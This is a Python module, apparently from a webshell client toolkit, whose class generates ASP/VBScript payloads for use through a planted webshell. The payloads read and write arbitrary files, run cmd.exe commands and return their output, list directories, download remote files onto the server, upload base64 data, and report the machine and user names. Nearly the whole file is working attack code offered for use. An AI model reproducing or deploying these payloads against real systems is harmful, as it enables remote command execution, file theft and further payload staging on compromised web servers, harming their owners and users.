"""ASP/VBScript code generator for webshell operations."""


class AspGenerator:
    """Generate ASP code for webshell operations."""

    @staticmethod
    def read_file(file_path: str, encoding: str = "utf-8") -> str:
        """Generate ASP code to read file."""
        return f"""Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("{file_path}", 1)
Response.Write(file.ReadAll())
file.Close()"""

    @staticmethod
    def write_file(file_path: str, content: str, encoding: str = "utf-8") -> str:
        """Generate ASP code to write file."""
        return f"""Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("{file_path}", True)
file.Write("{content}")
file.Close()"""

    @staticmethod
    def run_command(command: str, capture_output: bool = True) -> str:
        """Generate ASP code to execute command."""
        return f"""Set wsh = Server.CreateObject("WScript.Shell")
Set exec = wsh.Exec("cmd.exe /c {command}")
Response.Write(exec.StdOut.ReadAll())"""

    @staticmethod
    def list_directory(directory: str = ".") -> str:
        """Generate ASP code to list directory."""
        return f"""Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("{directory}")
For Each file In folder.Files
    Response.Write(file.Name & vbCrLf)
Next"""

    @staticmethod
    def download_file(url: str, save_path: str) -> str:
        """Generate ASP code to download file."""
        return f"""Set xmlhttp = Server.CreateObject("MSXML2.ServerXMLHTTP")
xmlhttp.Open "GET", "{url}", False
xmlhttp.Send
Set stream = Server.CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write xmlhttp.responseBody
stream.SaveToFile "{save_path}", 2
stream.Close"""

    @staticmethod
    def upload_file(file_path: str, content: str) -> str:
        """Generate ASP code to upload file (base64 content)."""
        return f"""Set stream = Server.CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write(decodeBase64("{content}"))
stream.SaveToFile "{file_path}", 2
stream.Close"""

    @staticmethod
    def get_system_info() -> str:
        """Generate ASP code to get system info."""
        return """Set wsh = Server.CreateObject("WScript.Shell")
Response.Write("Computer: " & wsh.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf)
Response.Write("User: " & wsh.ExpandEnvironmentStrings("%USERNAME%"))"""
